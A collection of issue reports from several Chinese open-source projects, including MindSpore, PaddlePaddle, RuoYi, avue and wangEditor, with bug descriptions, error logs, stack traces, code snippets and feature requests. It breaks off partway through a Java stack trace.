wangEditor插入的图片总在末尾处追加,"1. 问题描述 使用wangEditor发表文章，复制的图片到编辑器中，总在末尾处显示，未在鼠标点击的位置。 2. 问题分析 跟踪代码，发现是zhyd.core.js中注册上传文件插件方法追加内容方式有问题。 line 183行左右 3. 解决方案   <code>: // 注册上传文件插件 zhyd.wangEditor.plugins.registerUpload(editor, config.uploadUrl, config.uploadFileName, config.uploadType, function (result, curEditor) { // 图片上传并返回结果，自定义插入图片的事件（而不是编辑器自动插入图片！！！） // insertImg 是插入图片的函数，editor 是编辑器对象，result 是服务器端返回的结果 if (result.status == 200) { var imgFullPath = result.data; curEditor.txt.append('&lt;img src=""' + imgFullPath + '"" alt="""" style=""max-width: 100%;height: auto;border-radius: 6px;""/&gt;'); $contentBox.val(editor.txt.html()); } else { $.alert.error(result.message); } }); // 注册上传文件插件 zhyd.wangEditor.plugins.registerUpload(editor, config.uploadUrl, config.uploadFileName, config.uploadType, function (result, curEditor) { // 图片上传并返回结果，自定义插入图片的事件（而不是编辑器自动插入图片！！！） // insertImg 是插入图片的函数，editor 是编辑器对象，result 是服务器端返回的结果 if (result.status == 200) { var imgFullPath = result.data; //替换插入图片方式 curEditor.cmd.do('insertHTML', '&lt;img src=""' + imgFullPath + '"" alt="""" style=""max-width: 100%;height: auto;border-radius: 6px;""/&gt;') //curEditor.txt.append('&lt;img src=""' + imgFullPath + '"" alt="""" style=""max-width: 100%;height: auto;border-radius: 6px;""/&gt;'); $contentBox.val(editor.txt.html()); } else { $.alert.error(result.message); } });"
RequestParameterMapper类的mapParameter方法报NPE空指针异常,"我有2个项目都使用了knife4j，但是访问doc.html时其中一个正常，一个不正常，不正常项目在类的方法处报NPE空指针异常，异常信息和源码位置如图： 从头到尾检查了好几遍依然找不到原因，只好在报错的源码位置debug了，最终找到问题出在使用了注解定义的路由上，该路由使用的注解中未声明属性值如，从而导致NPE空指针异常。因此为保险起见，最好声明一下注解的属性值，特别是在使用了注解的路由上。   <code>: springfox.documentation.swagger2.mappers.RequestParameterMapper mapParameter @RequestBody @ApiImplicitParam paramType paramType = ""body"" @ApiImplicitParam paramType @RequestBody"
[ST][compatibility][MS][NET][wide&deep ps][GPU 8p/1p]network train failed,"兼容性测试：1.7分支脚步跑在r1.8.0版本 wide&amp;deep ps网络在GPU环境8p/1p训练失败 / 硬件环境: /device GPU : -- MindSpore version :r1.8.0 B030 commit_id:f51ce15a -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220616 MindSpore 版本：编译时间20220624181534 r1.8.0 commit_id:f51ce15a (/): /mode graph test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu.py test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily.py cd solution_test/remaining/test_scriptes/mindspore/net/wide_deep/network python -m nose -s --nologcapture test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily.py 网络训练成功 走给李振宇   <code>: [CRITICAL] PS(65119,7f04a97fa700,python):2022-06-27-14:12:11.615.116 [mindspore/ccsrc/ps/core/ps_worker_node.cc:123] Register] The node role:WORKER the node id:3ad1bdb0-57d3-46c1-909f-f34febbca21f register timeout! Traceback (most recent call last): File ""/ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 178, in &lt;module&gt; train_wide_and_deep() File ""/ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""/ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 175, in train_wide_and_deep train_and_eval(cfg) File ""/ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/wide_deep/network/test_ms_model_zoo_wide_deep_criteo_ps_train_infer_gpu_8p_daily/script/../train_and_eval_parameter_server_distribute.py"", line 144, in train_and_eval dataset_sink_mode=(parameter_server and cache_enable)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1047, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 91, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 609, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 668, in _train_dataset_sink_process dataset_helper=dataset_helper) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 436, in _exec_preprocess dataset_helper = DatasetHelper(dataset, dataset_sink_mode, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 337, in __init__ self.iter = iterclass(dataset, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 573, in __init__ super().__init__(dataset, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 436, in __init__ is_dynamic_shape=self.dynamic_shape) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 77, in _exec_datagraph need_run=need_run) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 980, in init_dataset need_run=need_run): RuntimeError: The node role:WORKER the node id:3ad1bdb0-57d3-46c1-909f-f34febbca21f register timeout!"
auth启动报错：tokenController；system启动报错：找不到或无法加载主类,auth: system:   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'tokenController': Unsatisfied dependency expressed through field 'tokenService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.ruoyi.common.security.service.TokenService': Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [com.ruoyi.common.security.service.TokenService] from ClassLoader [jdk.internal.loader.ClassLoaders$AppClassLoader@1f89ab83] 错误: 找不到或无法加载主类 com.ruoyi.system.RuoYiSystemApplication 原因: java.lang.ClassNotFoundException: com.ruoyi.system.RuoYiSystemApplication
QQ支付无支付结果返回错误,"HTTPS模式下，qq支付完成后，无法正常收到返回的支付结果。 QQ.PHP文件中GetPayParams函数 // 异步地址处理 $notify_url = (MY_HTTP == 'https' &amp;&amp; isset($this-&gt;config['agreement']) &amp;&amp; $this-&gt;config['agreement'] == 1) ? 'http'.mb_substr($params['notify_url'], 5, null, 'utf-8') : $params['notify_url']; 代码有误 应该为 // 异步地址处理 $notify_url = (MY_HTTP == 'https' &amp;&amp; isset($this-&gt;config['agreement']) &amp;&amp; $this-&gt;config['agreement'] == 1) ? $params['notify_url'] : 'http'.mb_substr($params['notify_url'], 5, null, 'utf-8'); 或者修改 [ 'element' =&gt; 'select', 'title' =&gt; '异步通知协议', 'message' =&gt; '请选择协议类型', 'name' =&gt; 'agreement', 'is_multiple' =&gt; 0, 'element_data' =&gt; [ ['value'=&gt;1, 'name'=&gt;'默认当前协议'], ['value'=&gt;2, 'name'=&gt;'强制https转http协议'], ], ], 为   <code>: [ 'element' =&gt; 'select', 'title' =&gt; '异步通知协议', 'message' =&gt; '请选择协议类型', 'name' =&gt; 'agreement', 'is_multiple' =&gt; 0, 'element_data' =&gt; [ ['value'=&gt;1, 'name'=&gt;'强制https转http协议'], ['value'=&gt;2, 'name'=&gt;'默认当前协议'], ], ],"
使用JPA2NameConversion命名方式生成实体类报错,使用JPA2NameConversion命名方式生成实体类报空指针   <code>: java.lang.NullPointerException at java.lang.Class.isAssignableFrom(Native Method) at org.beetl.sql.core.JPA2NameConversion.getPropertyName(JPA2NameConversion.java:40) at org.beetl.sql.ext.gen.SourceGen.gen(SourceGen.java:86) at org.beetl.sql.core.SQLManager.genPojoCode(SQLManager.java:1531) at GenCode.genJopoSql(GenCode.java:48) at GenCode.main(GenCode.java:62)
Simplify Quick Start,"Fixes https://github.com/baidu/Paddle/issues/111 Motivation The initial purpose of this PR is that it took me &gt;12 hours to run on a VM with my MacBook Pro. I checked with Yi Yang that he can run this in a few minutes on his powerful CPU&amp;GPU desktop. But I am afraid that the purpose of a QuickStart should be quick and start enough, so that potential clients can realistically feel the convenience brought by Paddle. Hence this PR. Comparison The time cost are primarily due to that the current approach downloads the full Amazon Reviews dataset, which is ~500MB gzipped and ~1.5GB unzipped. The process of the whole dataset also costs much time. So this PR's primary target is to download only part of the dataset. Compare with the existing approach, this PR uses a ~100-line Python script to replace , and , which add up to ~300 lines code, after a short discussion with @emailweixu , we decided to use space-delimited word segmentation to replace the Moses word segmenter, so no need to download the Mesos segmenter. can read directly from the HTTP server that hosts the data, or from a local copy of the data. In either case, it reads until required number of instances are scanned. This releases it from reading the whole dataset. The new script doesn't use , which exists in Linux but not in Mac OS X. So the new script works with both Linux and Mac OS X. Usage If we get this PR merged, the initialization steps described in the Quick Start guide would change from into Details Above commands read directly from the default URL for a number of JSON objects until it can generate which add up to 100 instances, the default number of dataset size. If we are going to generate a bigger dataset, say 1000 instances in total, we can run Or, if we already downloaded the file, we can run An additional command line parameter controls the cap size of the dictionary. If we want to generate an 1000-instance dataset while limitinug the dictionary size to 1999, we can do   <code>: preprocess.sh preprocess_data.py data/get_data.sh preprocess.py preprocess.sh preprocess_data.py shuf cd demo/quick_start ./data/get_data.sh ./preprocess.sh cd demo/quick_start python ./process_data.py ./process_data.py http://snap.stanford.edu/data/amazon/productGraph/categoryFiles/reviews_Electronics_5.json.gz {train,test,pred}.txt python ./process_data.py -n 1000 reviews_Electronics_5.json.gz python ./process_data.py ~/Download/reviews_Electronics_5.json.gz -t python ./process_data.py -n 1000 -t 1999 ~/Download/reviews_Electronics_5.json.gz"
login.html 中的验车码变量是怎么传过来的,"请教一下 ： 是怎么从后端传过来的   <code>: captchaEnabled &lt;div class=""row m-t"" th:if=""${captchaEnabled==true}""&gt;"
我这边想一个column更改多个类型,"代码如下 ps: =='我目前遇到了就是从array类型切换到input或者select的错误问题'==   <code>: option: { column: [ { prop: 'type', type: 'select', dicData: [ {label: '下拉框', value: 'select'}, {label: '输入框', value: 'input'}, {label: '数组框', value: 'array'}], change: ({value, column}) =&gt; { const optionIdx = this.option.column.length - 1 this.$set(this.option.column[optionIdx], 'type', value) } }, { prop: 'adjustable', rules: [ {required: true, message: '请输入', trigger: 'blur'} } ] } ] }"
DateTimePicker ViewMode不为Date 时行为不正确,"将DateTimePicker的ViewMode设置为Month 显示时间框后任意点击一个月份。 预期中应该点击的月份高亮或直接输入内容到input。现在则是显示了日期选择框。 无 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;DateTimePicker TValue=""DateTime"" ViewMode=""DatePickerViewMode.Month"" /&gt;"
Compiling error with CUDA 7.5.,"The latest code meets compiling error with CUDA 7.5:   <code>: Paddle/paddle/fluid/operators/math/math_function.cu(49): error: identifier ""cublasGemmAlgo_t"" is undefined Paddle/paddle/fluid/operators/math/math_function.cu(49): error: identifier ""CUBLAS_GEMM_DFALT"" is undefined Paddle/paddle/fluid/operators/math/math_function.cu(65): error: identifier ""CUDA_R_16F"" is undefined Paddle/paddle/fluid/operators/math/math_function.cu(65): error: identifier ""CUDA_R_32F"" is undefined"
Use None in Tensor index to expand dimension like PyTorch,"Customer's Demands on Product/Solution In PyTorch, ""None"" can be used in Tensor index, then the dimension of the Tensor will be expaned automatically. for example: Another example: The codes above are from SchNetPack (https://github.com/atomistic-machine-learning/schnetpack) The detials of this feature is on the websit of PyTorch: https://pytorch.org/cppdocs/notes/tensor_indexing.html This feature is very useful. I suggest Mindspore will has this feature. Gaps to Fill on Product/Solution Preliminary Discussion Acceptance Standards Requirement Value Description   <code>: def gaussian_smearing(distances, offset, widths, centered=False): r""""""Smear interatomic distance values using Gaussian functions. Args: distances (torch.Tensor): interatomic distances of (N_b x N_at x N_nbh) shape. offset (torch.Tensor): offsets values of Gaussian functions. widths: width values of Gaussian functions. centered (bool, optional): If True, Gaussians are centered at the origin and the offsets are used to as their widths (used e.g. for angular functions). Returns: torch.Tensor: smeared distances (N_b x N_at x N_nbh x N_g). """""" if not centered: # compute width of Gaussian functions (using an overlap of 1 STDDEV) coeff = -0.5 / torch.pow(widths, 2) # Use advanced indexing to compute the individual components diff = distances[:, :, :, None] - offset[None, None, None, :] else: # if Gaussian functions are centered, use offsets to compute widths coeff = -0.5 / torch.pow(offset, 2) # if Gaussian functions are centered, no offset is subtracted diff = distances[:, :, :, None] # compute smear distance values gauss = torch.exp(coeff * torch.pow(diff, 2)) return gauss # Weigh elements if requested if elemental_weights is not None: radial_distribution = ( radial_distribution[:, :, :, :, None] * elemental_weights[:, :, :, None, :].float() )"
" Cublas error, `CUBLAS_STATUS_INVALID_VALUE`.","cuda和cudnn是用的conan安装：cuda/10.0.130@xx/stable, cudnn/7.6.4@xx/stable。我只能使用这两个，不可以换别的方式。 在我自己的电脑上可以正常运行，但是部署在同事电脑上的时候出现问题。试了不同的安装方式(cu101)，报错是一样的：   <code>: &gt; nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2018 NVIDIA Corporation Built on Sat_Aug_25_21:08:01_CDT_2018 Cuda compilation tools, release 10.0, V10.0.130 Wed Jun 30 10:50:14 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 460.80 Driver Version: 460.80 CUDA Version: 11.2 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 GeForce RTX 2070 Off | 00000000:01:00.0 On | N/A | | 30% 38C P8 11W / 175W | 828MiB / 7982MiB | 5% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | 0 N/A N/A 1926 G /usr/lib/xorg/Xorg 36MiB | | 0 N/A N/A 2110 G /usr/bin/gnome-shell 91MiB | | 0 N/A N/A 3494 G /usr/lib/xorg/Xorg 372MiB | | 0 N/A N/A 3689 G /usr/bin/gnome-shell 79MiB | | 0 N/A N/A 4073 G ...AAAAAAAAA= --shared-files 45MiB | | 0 N/A N/A 4657 G ...AAAAAAAAA= --shared-files 60MiB | | 0 N/A N/A 5977 G /usr/lib/firefox/firefox 135MiB | +-----------------------------------------------------------------------------+ Python 3.6.9 (default, Jan 26 2021, 15:33:00) [GCC 8.4.0] on linux Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. &gt;&gt;&gt; import paddle /usr/lib/python3/dist-packages/setuptools/depends.py:2: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses import imp &gt;&gt;&gt; paddle.utils.run_check() Running verify PaddlePaddle program ... W0630 10:47:54.273962 30112 device_context.cc:404] Please NOTE: device: 0, GPU Compute Capability: 7.5, Driver API Version: 11.2, Runtime API Version: 11.2 W0630 10:47:54.276033 30112 device_context.cc:422] device: 0, cuDNN Version: 7.6. Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/utils/install_check.py"", line 196, in run_check _run_static_single(use_cuda) File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/utils/install_check.py"", line 124, in _run_static_single exe.run(startup_prog) File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/fluid/executor.py"", line 1110, in run six.reraise(*sys.exc_info()) File ""/home/l.aigner/.local/lib/python3.6/site-packages/six.py"", line 719, in reraise raise value File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/fluid/executor.py"", line 1108, in run return_merged=return_merged) File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/fluid/executor.py"", line 1239, in _run_impl use_program_cache=use_program_cache) File ""/home/l.aigner/.local/lib/python3.6/site-packages/paddle/fluid/executor.py"", line 1329, in _run_program [fetch_var_name]) OSError: (External) Cublas error, `CUBLAS_STATUS_INVALID_VALUE`. An unsupported value or parameter was passed to the function (a negative vector size, for example). (at /paddle/paddle/fluid/platform/cuda_helper.h:107)"
paddle v2 api gpu can not use dropout_layer.,"here is my code dropout_layer work for cpu, but gpu not. it will get the follow error.   <code>: dropout_layer = paddle.networks.dropout_layer(input=concat_layer, dropout_rate=0.5) # fc and output layer output = paddle.layer.fc(input=dropout_layer, size=class_dim, act=paddle.activation.Sigmoid()) Traceback (most recent call last): File ""model.py"", line 188, in &lt;module&gt; train_cnn_model(num_pass=num_pass) File ""model.py"", line 108, in train_cnn_model [cost, output, label] = convolution_net(dict_dim, class_dim=class_dim) File ""model.py"", line 42, in convolution_net dropout_layer = paddle.networks.dropout_layer(input=concat_layer, dropout_rate=0.5) AttributeError: 'module' object has no attribute 'dropout_layer'"
使用https后websocket一直重连,版本号：   <code>: 微服务版本2.4.3 使用https后，websocket一直在创建新的连接
Polish OpWithKernel,Chage to . Make it easier to understand. Change to Make operator developers can customize which kernel the operator will use in runtime.   <code>: IndicateDataType GetKernelType OpKernelKey OpKernelType
多租户 SQL 解析器对存储过程和级联查询的不支持,"版本：3.0-alpha   <code>: select t1.* from t1 left join (select t2.id,t2.t1_id from t2) as tmp_t2 on tmp_t2.t1_id = t1.id; 或这种语句 select tmp_t1.* from (select * from t1) as tmp_t1;"
【众智】【计算-GPU开发】LowerBound,"sorted_x values output Infer时确认输出数据类型 | 对应底层算子 Classify Name Type Type Range Required INPUT sorted_x fp16, fp32, int8, int16, uint16, int32, int64, double TRUE INPUT values fp16, fp32, int8, int16, uint16, int32, int64, double TRUE OUTPUT y int32, int64 TRUE ATTR out_type Type int32 FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/LowerBound?hl=zh-cn 3. 异常处理 4. 算子反向 无反向   <code>: 对每一行，返回values的值作为下边界时在排序输入中的索引值。 class LowerBound (Primitive):"
nonexistent,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
关于Db.paginate中使用order by计算条数的时候被替换的问题,"使用的是oracle数据库 我执行的sql语句如下中有如下一段： 看了jfinal的源码，其中中执行的语句把ordery by给替换了 这样就导致最终的sql里，WITHIN GROUP()里没参数了 我现在的做法是调用findList,然后自己查条数 这是否算是一个Bug呢？   <code>: ...LISTAGG (name, ',') WITHIN GROUP(ORDER BY id)... String totalRowSql = ""select count(*) "" + config.dialect.replaceOrderBy(sqlExceptSelect);"
swagger调用 新模块报错 clientId和Secret空异常,pig版本:2.10.3 是否修改包名: 无   <code>: 2020-12-11 11:29:37.501 WARN 12980 --- [ XNIO-1 task-1] o.s.s.o.p.token.RemoteTokenServices : Null Client ID or Client Secret detected. Endpoint that requires authentication will reject request with 401 error. 2020-12-11 11:29:37.658 ERROR 12980 --- [ XNIO-1 task-1] io.undertow.request : UT005022: Exception generating error page /error java.lang.RuntimeException: java.lang.NullPointerException at io.undertow.servlet.spec.RequestDispatcherImpl.error(RequestDispatcherImpl.java:507) at io.undertow.servlet.spec.RequestDispatcherImpl.error(RequestDispatcherImpl.java:427) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:308) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:370) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:836) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at java.lang.Thread.run(Thread.java:748) Caused by: java.lang.NullPointerException: null
【众智】【计算-GPU开发】Addcmul,"Performs the element-wise product of tensor x1 and tensor x2, multiply the result by the scalar value and add it to input_data. input_data x1 x2 value y 对应底层算子 Classify Name Type Type Range Required Format INPUT input_data fp16, float, int8, int32, uint8, double, int64 TRUE INPUT x1 fp16, float, int8, int32, uint8, double, int64 TRUE INPUT x2 fp16, float, int8, int32, uint8, double, int64 TRUE INPUT value fp16, float, int8, int32, uint8, double, int64 TRUE OUTPUT y fp16, float, int8, int32, uint8, double, int64 TRUE 标杆接口参考 PyTorch接口： https://pytorch.org/docs/1.8.1/generated/torch.addcmul.html?highlight=addcmul#torch.addcmul 3. 异常处理 4. 算子反向 参考Pytorch算子反向实现，依赖Conj算子实现。 参考链接： https://github.com/pytorch/pytorch/blob/v1.8.1/tools/autograd/derivatives.yaml 中 addcmul 的反向算子   <code>: output = tensor1 * tensor2 * value + input class Addcmul(Primitive):"
 [移除] `ValidationTypes.Required` 验证,目前 和官方的 冲突，所以取消该类型。   <code>: ValidationTypes.Required [Required]
多选表格如何设置默认选中行,"如下面的样式   <code>: &lt;avue-crud ref=""crud"" :page.sync=""page"" :data=""data"" :option=""option"" @selection-change=""selectionChange"" @on-load=""onLoad""&gt; &lt;/avue-crud&gt; export default { data() { return { page: { pageSize: 20, pagerCount:5 }, data: [], option:{ selection: true, selectable:(row,index)=&gt;{ return index===1; }, reserveSelection:true, align:'center', menuAlign:'center', column:[ { label:'姓名', prop:'name' }, { label:'性别', prop:'sex' } ] }, }; }, methods: { onLoad(page) { this.$message.success('分页信息:' + JSON.stringify(page)) this.page.total = 40 //模拟分页 if (this.page.currentPage === 1) { this.data = [ { id:1, name: '张三', sex: '男' },{ id:2, name: '李四', sex: '女' } ] } else if (this.page.currentPage == 2) { this.data = [ { id:3, name: '王五', sex: '女' },{ id:4, name: '赵六', sex: '女' } ] } }, } }"
decouple the logic of processing sparse var list from rpc server,Need to deal with sparse var list in to keep RPCServer interface clean.   <code>: listen_and_server_op
avue-tree子节点新增缺陷,版本号：2.6.4 问题描述：选择子节点右键新增时，save方法未提供该子节点的信息，导致无法直观从save方法中获取子节点信息来确定待新增节点的父节点，而只能使用方法获取。   <code>: this.$refs.xxx.node
[MS][CPU][PYNATIVE][LSTM] pynative mode train fail,": /device cpu : -- MindSpore version :846f6a -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_usability_benchmark_pynative_cpu_lstm_sentimentnet_time_perf_loss_1p_0001 download models code set pynative mode run train.py lstm 网络pynative模式训练失败 lstm网络pynative模式训练失败   <code>: ============== Starting Data Pre-processing ============== preprocess path /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/lstm/pynative/test_ms_usability_benchmark_pynative_cpu_lstm_sentimentnet_time_perf_loss_1p_0001/preprocess is not exist ============== Starting Training ============== epoch: 1 step: 1, loss is 0.6935914158821106 free(): invalid pointer"
BUILD FAILURE--执行bin/package.bat进行打成war包文件报错,"执行bin/package.bat进行打成war包文件 执行bin/package.bat   <code>: Downloading from jeesite-repos: http://maven.jeesite.net/repository/maven-public/com/jeesite/jeesite-module-stock/4.3.0-SNAPSHOT/jeesite-module-stock-4.3.0-SNAPSHOT.pom Downloading from sonatype-repos-s: https://oss.sonatype.org/content/repositories/snapshots/com/jeesite/jeesite-module-stock/4.3.0-SNAPSHOT/jeesite-module-stock-4.3.0-SNAPSHOT.pom [INFO] ------------------------------------------------------------------------ [INFO] BUILD FAILURE [INFO] ------------------------------------------------------------------------ [INFO] Total time: 23.919 s [INFO] Finished at: 2021-11-22T10:30:36+08:00 [INFO] ------------------------------------------------------------------------ [ERROR] Failed to execute goal on project jeesite-web-pro: Could not resolve dependencies for project com.jeesite:jeesite-web-pro:war:4.3.0-SNAPSHOT: Failed to collect dependencies at com.jeesite:jeesite-module-basemodel:jar:4.3.0-SNAPSHOT: Failed to read artifact descriptor for com.jeesite:jeesite-module-basemodel:jar:4.3.0-SNAPSHOT: Could not transfer artifact com.jeesite:jeesite-module-basemodel:pom:4.3.0-SNAPSHOT from/to jeesite-repos (http://maven.jeesite.net/repository/maven-public): Authorization failed for http://maven.jeesite.net/repository/maven-public/com/jeesite/jeesite-module-basemodel/4.3.0-SNAPSHOT/jeesite-module-basemodel-4.3.0-SNAPSHOT.pom 403 Forbidden -&gt; [Help 1] [ERROR] [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch. [ERROR] Re-run Maven using the -X switch to enable full debug logging. [ERROR] [ERROR] For more information about the errors and possible solutions, please read the following articles: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException"
【Need Discussion】关于ParameterOptimiser模块架构上的链式调用设计实现，对正则算法的影响,"在阅读sparse正则优化这块，发现一些疑问， 尝试分析ParameterOptimiser模块的设计实现，以及其对正则的影响。 Optimizer模块主要采用链式调用的方法来整合对丰富多样的正则控制、梯度clipping、一阶优化算法及其变种算法的支持。直观上的疑问，是否都能采用链式规则来处理所有算法。 举例： 如果一个模型同时配置了momentum优化算法、特定参数支持sparse update、加L2正则、加梯度clipping防爆、加average优化提高模型精度几个过程： Step 1: .... -&gt; Regularizer (optimizer) -&gt; Averager ( Regularizer (optimizer) ) Step 2： 一阶optimizer -&gt; clipping(一阶optimizer) Step 3: 一阶optimizer -&gt; clipping(一阶optimizer) -&gt; SparseRegularizer (clipping(一阶optimizer) ) Step4， 一阶optimizer -&gt; clipping(一阶optimizer) -&gt; SparseRegularizer (clipping(一阶optimizer) ) -&gt; Averager ( SparseRegularizer (clipping(一阶optimizer) ) ) 综上， 上述链式调用的优化过程，基本上一级一级的调用，串行完成对clipping梯度 -&gt; 一阶优化（无正则）-&gt; 稀疏正则 -&gt; 对最后的value值进行average几个过程。 其中，除了（一阶优化（无正则）-&gt; 稀疏正则）外，其他几个阶段比较直观，容易理解为串行的链式处理过程。 （一阶优化（无正则）-&gt; 稀疏正则） 的疑问： 比如对于momentum算法， 这种链式处理正实际效果是： 正则项的梯度没有贡献到momentum项，而是仅仅贡献到参数权重value值（特指weight value，区别于对应的gradient） 正则过程是针对当前batch优化后的weight value，而不是理论上当前batch的value项。 另外，理论上任何依赖梯度来构建中间变量的优化算法，都会受这种链式调用影响，忽略正则贡献的梯度信息。 此处，从梯度下降角度，这种做法可能不影响最终的效果，但是有必要明确一下与一般的正则过程的实际区别。 有必要指出的是， 比如SgdLocalUpdater 由于历史原因未采用链式调用方法构建优化object，它的正则默认利用了在一阶优化算法的默认正则功能，该正则功能符合以下特点： 正则项梯度会贡献给到momentum 使用当前batch的weight value进行正则 它比较符合常规的理解。 @lcy-seso @PL @reyoung @qingqing01 详细描述此历史实现，可能对不同平台模型收敛验证有些帮助，大家也可以comment。 如果有理解不正确的，也请指正。   <code>: // creator for AverageOptimizer ParameterOptimizer* sgdOptimizerCreate(const OptimizationConfig&amp; optConfig, const ParameterConfig&amp; paraConfig, bool isParameterSparse, bool inPserver) { ParameterOptimizer* optimizer = OptimizerWithRegularizer::create( optConfig, paraConfig, isParameterSparse, inPserver); return AverageOptimizer::create( optConfig, optimizer, isParameterSparse, inPserver /*useParameterApply*/); } // factory method to create instance of OptimizerWithRegularizer ParameterOptimizer* OptimizerWithRegularizer::create( const OptimizationConfig&amp; optConfig, const ParameterConfig&amp; paraConfig, bool isParameterSparse, bool inPserver) { ParameterOptimizer* optimizer = ParameterOptimizer::create(optConfig, inPserver); if (paraConfig.gradient_clipping_threshold() &gt; 0.0f &amp;&amp; !dynamic_cast&lt;AddOptimizer*&gt;(optimizer)) { optimizer = new OptimizerWithGradientClipping(optConfig, optimizer); } if (isParameterSparse) { CHECK(paraConfig.momentum() == 0.0f) &lt;&lt; ""Parameter cannot support momentum if it's sparse.""; optimizer-&gt;setNoDecay(); return new OptimizerWithRegularizerSparse( optConfig, optimizer, regularizer); }"
gateway加上zipkin报错,加上zipkin之后gateway启动直接报错 错误信息如下：   <code>: &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt; &lt;/dependency&gt; Caused by: org.springframework.beans.factory.BeanNotOfRequiredTypeException: Bean named 'sopAsyncConfigurer' is expected to be of type 'com.gitee.sop.gatewaycommon.sync.SopAsyncConfigurer' but was actually of type 'org.springframework.cloud.sleuth.instrument.async.LazyTraceAsyncCustomizer' at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1317) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at 